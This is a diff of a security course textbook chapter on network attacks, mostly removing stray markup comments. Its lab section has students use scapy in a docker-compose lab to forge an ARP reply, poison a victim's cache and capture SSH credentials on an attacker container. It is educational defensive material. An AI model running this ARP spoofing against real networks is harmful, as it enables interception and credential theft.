@@ -5,95 +5,69 @@
 
 				<section xml:id="interception-attacks">
 					<title>5.1. Interception Attacks</title>
-					<!-- div attr= class="paragraph"-->
 					<p>
 					Interception attacks rely on the ability to intercept network communications. This may be due to the nature of the network being used or sometimes other methods may leveraged to better position the attacker. These attacks generally involve forging fictitious messages, recording transmitted data, or altering the contents of messages while on a network. This family of attacks places all parts of the CIA triad at risk.
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="sect3"-->
+
 					<paragraphs xml:id="mitm">
 						<title>5.1.1. MitM</title>
-						<!-- div attr= class="imageblock right"-->
-						<!-- div attr= class="content"-->
+
 						<figure>
 							<image source="mitm.svg"/>
 							<caption></caption>
 						</figure>
-						<!--</div attr= class="content">-->
-						<!--</div attr= class="imageblock right">-->
-						<!-- div attr= class="paragraph"-->
+
 						<p>
 						A man in the middle attack (MitM) is a blanket term applied when an attacker is intercepting communication. A typical attack involves eavesdropping and possibly modifying messages between two parties. Encryption can be used to mitigate the attack, making it impossible for an attacker to decrypt the messages they are intercepting. That being said, particular attention must be paid to the handshaking/key exchange protocol to be sure that an attacker does not gain access to the key(s) being used. What follows is an example of MitM being used to intercept and modify the public key exchange:
 					</p>
-						<!--</div attr= class="paragraph">-->
-						<!-- div attr= class="imageblock text-center"-->
-						<!-- div attr= class="content"-->
+
 						<figure>
 							<image source="mitm-keys.svg"/>
 							<caption></caption>
 						</figure>
-						<!--</div attr= class="content">-->
-						<!--</div attr= class="imageblock text-center">-->
-						<!-- div attr= class="paragraph"-->
+
 						<p>
 						In the above example the MitM allows the first message to pass unmolested, but tampers with the exchange of the public key. By passing it’s own public key to Bob, the MitM has to ability to decrypt the messages that Bob sends and can still use Alice’s public key to re-encrypt the messages at pass them to her. You can see how if two public keys are exchanged in this manner it would be possible to set up a MitM attack where despite encryption all messages can be seen.
 					</p>
-						<!--</div attr= class="paragraph">-->
-						<!--</div attr= class="sect3">-->
-						<!-- div attr= class="sect3"-->
+
 					</paragraphs>
 					<paragraphs xml:id="mitb-_mitb">
 						<title>5.1.2.</title>
-						<!-- div attr= class="paragraph"-->
+	
 						<p>
 						MitB stands for man in the browser and is typically caused by a trojan installing malware that allows the attacker to intercept/modify communications between the browser and the server. This can be used to capture data on forms, modify input, or modify the response from the server. Often the software used in MitB attacks lays dormant until the victim browses to a targeted website. What follows is an example of how a MitB attack can be used to modify an online banking request to send money:
 					</p>
-						<!--</div attr= class="paragraph">-->
-						<!-- div attr= class="imageblock text-center"-->
-						<!-- div attr= class="content"-->
+
 						<figure>
 							<image source="mitb.svg"/>
 							<caption></caption>
 						</figure>
-						<!--</div attr= class="content">-->
-						<!--</div attr= class="imageblock text-center">-->
-						<!-- div attr= class="paragraph"-->
+
 						<p>
 						As you can see the attacker ended up with $10,000 and the victim simply thought they authorized a payment of $1,000 to someone else. These attacks can be difficult to detect because they take place within the browser and are opportunistic.
 					</p>
-						<!--</div attr= class="paragraph">-->
-						<!--</div attr= class="sect3">-->
-						<!-- div attr= class="sect3"-->
+
 					</paragraphs>
 					<paragraphs xml:id="replay-attacks">
 						<title>5.1.3. Replay Attacks</title>
-						<!-- div attr= class="paragraph"-->
+
 						<p>
 						This family of attacks typically involves a MitM making a copy of the transmission and 
 							<em>replaying</em> it to impersonate the victim. Logon credentials, simple hashes, and specific commands are sometimes susceptible to this type of attack. The solution is to use timestamps, nonces (random number for that particular session), rotating keys, or a counter to make sure commands cannot be executed outside of context.
 					
 						</p>
-						<!--</div attr= class="paragraph">-->
-						<!-- div attr= class="sidebarblock"-->
-						<!-- div attr= class="content"-->
-						<!-- div attr= class="title"-->
+
 						<example>
 							<title>One-time Passwords</title>
 						<p>
 						To help mitigate replay attacks, an online banking application may require that client use a one-time password (OTP) when submitting transactions. An OTP is a frequently changing value that is known to both the client and the server. Several one-time password schemes exist, most of which make use of a cryptographic hash function with a shared seed between client and server. Periodically the client and server update to a new hash based on the seed and without the seed it is impossible to know what the next hash will be. By using an OTP anyone who intercepts the traffic will not be able to perform a replay attack as the password will not be current.
 						</p>
 						</example>
-						
-						<!--</div attr= class="paragraph">-->
-						<!--</div attr= class="content">-->
-						<!--</div attr= class="sidebarblock">-->
-						<!--</div attr= class="sect3">-->
-						<!-- div attr= class="sect3"-->
+
 					</paragraphs>
 					<paragraphs xml:id="ssl-circumvention-_ssl_circumvention">
 						<title>5.1.4. SSL Circumvention</title>
-						<!-- div attr= class="imageblock right"-->
-						<!-- div attr= class="content"-->
+
 						<figure>
 							<image source="ssl-mitm.svg"/>
 							<caption>MitM preventing HTTPS upgrade and skimming passwords</caption>
@@ -123,13 +97,11 @@
 					</paragraphs>
 					<paragraphs xml:id="mac-flooding-_mac_flooding">
 						<title>5.2.2. MAC Flooding</title>
-						<!-- div attr= class="paragraph"-->
+
 						<p>
 						Switches are tasked with keeping track of which MAC addresses correspond to which ports on the switch. They use this to make sure that traffic is only routed where it needs to go. Given that MAC addresses can be changed, an attacker could flood a switch with packets from many different MAC addresses and possibly overflow the MAC-port routing table. Some switches may default to hub-like functionality and send frames to all ports in an effort to keep traffic flowing. This then allows an attacker to capture traffic from other machines on the network.
 					</p>
-						<!--</div attr= class="paragraph">-->
-						<!--</div attr= class="sect3">-->
-						<!-- div attr= class="sect3"-->
+
 					</paragraphs>
 					<paragraphs xml:id="arp-poisoning-_arp_poisoning">
 						<title>5.2.3. ARP Poisoning</title>
@@ -183,7 +155,6 @@
 							</p>
 						</example>
 						
-						
 					</paragraphs>
 				</section>
 				<section xml:id="name-resolution-attacks">
@@ -201,7 +172,6 @@
 					</paragraphs>
 					<paragraphs xml:id="llmnr-hijacking">
 						<title>5.4.2. LLMNR Hijacking</title>
-						<!-- div attr= class="paragraph"-->
 						<p>
 						In this scenario an attacker responds to a Link-Local Multicast Name Resolution (LLMNR) broadcast and impersonates an authentication server. The unexpecting victim fills in their credentials, which are promptly stolen. This attack can be mitigated by disabling LLMNR on the network.
 					</p>
@@ -210,7 +180,7 @@
 				</section>
 				<section xml:id="web-based-attacks">
 					<title>5.5. Web-based Attacks</title>
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					The world wide web and the protocols/formats/languages it uses (HTTP, HTML, JavaScript, etc.) were 
 						<em>not</em> originally designed with security in mind. By default, web pages trust the content they receive to not be malicious. Scripts, commands, cookies, etc. are implicitly trusted. Web technologies have become so popular that they are a common target for attackers and developers must use tokens, sanitize data, and check inputs if they want those technologies to be secure.
@@ -277,8 +247,7 @@
 							</li>
 						</ul>
 					</p>
-					<!--</div attr= class="ulist">-->
-					<!-- div attr= class="sect3"-->
+
 					<paragraphs xml:id="xss">
 						<title>5.5.1. XSS</title>
 						
@@ -614,21 +583,16 @@ $statement = "SELECT * FROM users WHERE name='" + $userName + "' AND password='"
 						<c>attacker</c> directories in the directory you are in.
 				
 					</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					In the first terminal run the 
 						<c>docker-compose up</c> command to build the images and run the containers:
 				
 					</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="listingblock"-->
-					<!-- div attr= class="title"-->
+
 					<p>
 					docker-compose up
 				</p>
-					<!--</div attr= class="title">-->
-					<!-- div attr= class="content"-->
 					<pre>PS C:\Users\rxt1077\it230\labs\scapy&gt; docker-compose up
 Creating network "scapy_testnet" with the default driver
 Creating scapy_server_1   ... done
@@ -692,8 +656,6 @@ server_1    | Server listening on :: port 22.</pre>
 					<p>
 					victim
 				</p>
-					<!--</div attr= class="title">-->
-					<!-- div attr= class="content"-->
 					
 					<pre>PS C:\Users\rxt1077\it230\labs\scapy&gt; docker-compose run victim bash
 Creating scapy_victim_run ... done
@@ -703,9 +665,7 @@ root@server's password: (1)
 You are now logged into 'server' (presumably from 'victim') via SSH for this assignment.
 Leave this connection open while you experiment with scapy from 'attacker'.
 bf9ebe42a108:~#</pre>
-					<!--</div attr= class="content">-->
-					<!--</div attr= class="listingblock">-->
-					<!-- div attr= class="colist arabic"-->
+
 					<ol>
 						<li>
 							<p>
@@ -733,8 +693,7 @@ bf9ebe42a108:~#</pre>
 					<p>
 					attacker
 				</p>
-					<!--</div attr= class="title">-->
-					<!-- div attr= class="content"-->
+
 					<pre>PS C:\Users\rxt1077\it230\labs\scapy&gt; docker-compose exec attacker bash
 root@5195de3d330c:/# ip addr add 172.20.0.5 dev eth0
 root@5195de3d330c:/# ip addr
@@ -752,9 +711,7 @@ root@5195de3d330c:/# ip addr
        valid_lft forever preferred_lft forever
     inet 172.20.0.5/32 scope global eth0 (2)
        valid_lft forever preferred_lft forever</pre>
-					<!--</div attr= class="content">-->
-					<!--</div attr= class="listingblock">-->
-					<!-- div attr= class="colist arabic"-->
+
 					 <ol>
 						<li>
 							<p>
@@ -806,27 +763,19 @@ AutoCompletion, History are disabled.
                   spCPY//////YPSps
                        ccaacs
 &gt;&gt;&gt;</pre>
-					<!--</div attr= class="content">-->
-					<!--</div attr= class="listingblock">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					You’ll notice that scapy’s prompt is &gt;&gt;&gt;, just like python because it 
 						<em>is</em> python. Since we’re working in python, let’s make our lives easier by defining a few simple variables:
 				
 					</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="listingblock"-->
-					<!-- div attr= class="title"-->
+
 					<p>
 					attacker
 				</p>
-					<!--</div attr= class="title">-->
-					<!-- div attr= class="content"-->
+
 					<pre>&gt;&gt;&gt; server_ip = "172.20.0.5" (1)
 &gt;&gt;&gt; victim_ip = "172.20.0.6"</pre>
-					<!--</div attr= class="content">-->
-					<!--</div attr= class="listingblock">-->
-					<!-- div attr= class="colist arabic"-->
 					<ol>
 						<li>
 							<p>
@@ -839,14 +788,11 @@ AutoCompletion, History are disabled.
 					<p>
 					Now let’s see how scapy allows us to build packets. We’ll make an Ethernet frame, with an IP packet inside it, with an ICMP echo request in that, with the data being set to our name:
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="listingblock"-->
-					<!-- div attr= class="title"-->
+
 					<p>
 					attacker
 				</p>
-					<!--</div attr= class="title">-->
-					<!-- div attr= class="content"-->
+
 					<pre>&gt;&gt;&gt; ping = Ether()/IP(dst=server_ip)/ICMP()/"Ryan Tolboom" (1)
 &gt;&gt;&gt; ping.show() (2)
 ###[ Ethernet ]###
@@ -914,9 +860,7 @@ Received 2 packets, got 1 answers, remaining 0 packets
 &gt;&gt;&gt; server_mac = result[0][0].src
 &gt;&gt;&gt; server_mac
 '02:42:ac:14:00:05'</pre>
-					<!--</div attr= class="content">-->
-					<!--</div attr= class="listingblock">-->
-					<!-- div attr= class="colist arabic"-->
+
 					<ol>
 						<li>
 							<p>
@@ -941,8 +885,7 @@ Received 2 packets, got 1 answers, remaining 0 packets
 						<c>server_mac</c> variable.
 				
 					</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="admonitionblock important deliverable"-->
+
 					<question>
 						<p>
 							Take a screenshot of your scapy session at this point showing that you completed an ICMP echo request/response with your name in it.
@@ -952,14 +895,11 @@ Received 2 packets, got 1 answers, remaining 0 packets
 					<p>
 					We can also determine MAC addresses at Layer 2 with an ARP "who-has" request. Let’s craft and send a broadcast ethernet frame with an ARP "who-has" request for the victims’s IP address. The result will tell use what the victim’s MAC address is:
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="listingblock"-->
-					<!-- div attr= class="title"-->
+
 					<p>
 					attacker
 				</p>
-					<!--</div attr= class="title">-->
-					<!-- div attr= class="content"-->
+
 					<pre>&gt;&gt;&gt; whohas = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victim_ip)
 &gt;&gt;&gt; result = srp1(whohas)
 Begin emission:
@@ -983,9 +923,7 @@ Received 1 packets, got 1 answers, remaining 0 packets
      pdst      = 172.20.0.7
 
 &gt;&gt;&gt; victim_mac = result[0].src</pre>
-					<!--</div attr= class="content">-->
-					<!--</div attr= class="listingblock">-->
-					<!-- div attr= class="colist arabic"-->
+
 					<ol>
 						<li>
 							<p>
@@ -1000,76 +938,53 @@ Received 1 packets, got 1 answers, remaining 0 packets
 						<em>from the person who legitimately has that MAC and IP</em>.
 				
 					</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					We have everything we need to create an ARP packet telling the victim to send traffic to us when they are trying to access servers IP:
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="listingblock"-->
-					<!-- div attr= class="title"-->
 					<p>
 					attacker
 				</p>
-					<!--</div attr= class="title">-->
-					<!-- div attr= class="content"-->
+
 					<pre>&gt;&gt;&gt; victim_ip, victim_mac, server_ip, server_mac
 ('172.20.0.6', '02:42:ac:14:00:06', '172.20.0.5', '02:42:ac:14:00:05')</pre>
-					<!--</div attr= class="content">-->
-					<!--</div attr= class="listingblock">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					Now let’s make and view an evil ARP packet:
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="listingblock"-->
-					<!-- div attr= class="title"-->
+
 					<p>
 					attacker
 				</p>
-					<!--</div attr= class="title">-->
-					<!-- div attr= class="content"-->
+
 					<pre>&gt;&gt;&gt; bad_arp = ARP(op=2, pdst=victim_ip, psrc=server_ip, hwdst=victim_mac)
 &gt;&gt;&gt; bad_arp
 &lt;ARP  op=is-at psrc=172.20.0.5 hwdst=02:42:ac:14:00:06 pdst=172.20.0.6 |&gt;</pre>
-					<!--</div attr= class="content">-->
-					<!--</div attr= class="listingblock">-->
-					<!-- div attr= class="paragraph"-->
 					<p>
 					This packet posits itself as coming from the server, it is aimed at the victim in both IP and MAC, but the MAC address that will be used to send it is ours (by default, we don’t specify with 
 						<c>hwsrc</c>). This means the victim will update their ARP cache such that frames destined for server go to attacker. This effectively reroutes all layer 2 traffic that was going to the server from the victim.
 				
 					</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					Go ahead an send that ARP packet:
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="listingblock"-->
-					<!-- div attr= class="title"-->
+
 					<p>
 					attacker
 				</p>
-					<!--</div attr= class="title">-->
-					<!-- div attr= class="content"-->
+
 					<pre>&gt;&gt;&gt; send(bad_arp)
 .
 Sent 1 packets.</pre>
-					<!--</div attr= class="content">-->
-					<!--</div attr= class="listingblock">-->
-					<!-- div attr= class="paragraph"-->
+
 					<p>
 					Now go back to the victim terminal with the SSH connection to server and try typing something. As soon as SSH has to send data, you will get a broken pipe error and the connection will drop. Faced with such a problem, what do you think most users will do? Probably try to reconnect, let’s try that too. Remember the password is "password".
 				</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="listingblock"-->
-					<!-- div attr= class="title"-->
+
 					<p>
 					victim
 				</p>
-					<!--</div attr= class="title">-->
-					<!-- div attr= class="content"-->
 					<pre>You are now logged into 'server' (presumably from 'victim') via SSH for this assignment.
 Leave this connection open while you experiment with scapy from 'attacker'.
 bf9ebe42a108:~# client_loop: send disconnect: Broken pipe (1)
@@ -1077,9 +992,7 @@ bash-5.0# ssh server
 Warning: Permanently added 'server,172.20.0.5' (ECDSA) to the list of known hosts.
 root@server's password:
 #</pre>
-					<!--</div attr= class="content">-->
-					<!--</div attr= class="listingblock">-->
-					<!-- div attr= class="colist arabic"-->
+
 					 <ol>
 						<li>
 							<p>
@@ -1093,18 +1006,13 @@ root@server's password:
 						<c>docker-compose up</c>, you’ll see the credentials entered:
 				
 					</p>
-					<!--</div attr= class="paragraph">-->
-					<!-- div attr= class="listingblock"-->
-					<!-- div attr= class="title"-->
+
 					<p>
 					docker-compose up terminal
 				</p>
-					<!--</div attr= class="title">-->
-					<!-- div attr= class="content"-->
+
 					<pre>attacker_1  | 2021/10/07 01:21:41 [172.20.0.6:60252] authentication for user "root" with password "password" accepted</pre>
-					<!--</div attr= class="content">-->
-					<!--</div attr= class="listingblock">-->
-					<!-- div attr= class="admonitionblock important deliverable"-->
+					
 					<question>
 						<ol>
 							<li>
@@ -1127,8 +1035,6 @@ why not?
 						</ol>
 					</question>
 
-					<!--</div attr= class="admonitionblock important deliverable">-->
-					<!-- div attr= class="paragraph"-->
 					<p>
 					To stop the running containers, you can type Ctrl-C in the terminal running 
 						<c>docker-compose up</c>, exit out of the victim, and exit out of the attacker.
@@ -1138,7 +1044,7 @@ why not?
 				</section>
 				<section xml:id="attacks-review">
 					<title>5.8. Review Questions</title>
-					<!-- div attr= class="qlist qanda"-->
+
 					<p>
 						<ol>
 							<li>
@@ -1158,11 +1064,5 @@ why not?
 							</li>
 						</ol>
 					</p>
-					<!--</div attr= class="qlist qanda">-->
-					<!--</div attr= class="sect2">-->
-					<!--</div attr= class="sectionbody">-->
-					<!--</div attr= class="sect1">-->
-					<!-- div attr= class="sect1"-->
 				</section>
-
 </chapter>
